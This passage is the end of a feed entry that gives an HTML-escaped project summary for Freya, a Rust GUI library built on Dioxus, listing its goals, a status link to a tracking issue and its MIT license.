dioxus-std and other Dioxus renderer-agnostic libraries&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Goals 😁&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Performant and low memory usage&lt;/li&gt; &#xA; &lt;li&gt;Good developer experience&lt;/li&gt; &#xA; &lt;li&gt;Cross-platform support&lt;/li&gt; &#xA; &lt;li&gt;Decent Accessibility support&lt;/li&gt; &#xA; &lt;li&gt;Useful testing APIs&lt;/li&gt; &#xA; &lt;li&gt;Useful and extensible components and hooks&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Status ⌚&lt;/h2&gt; &#xA;&lt;p&gt;You can see the tracking &lt;a href=&#34;https://github.com/marc2332/freya/issues/200&#34;&gt;issue&lt;/a&gt; to know what features are implemented and which ones are not, yet.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/marc2332/freya/main/LICENSE.md&#34;&gt;MIT License&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
</feed>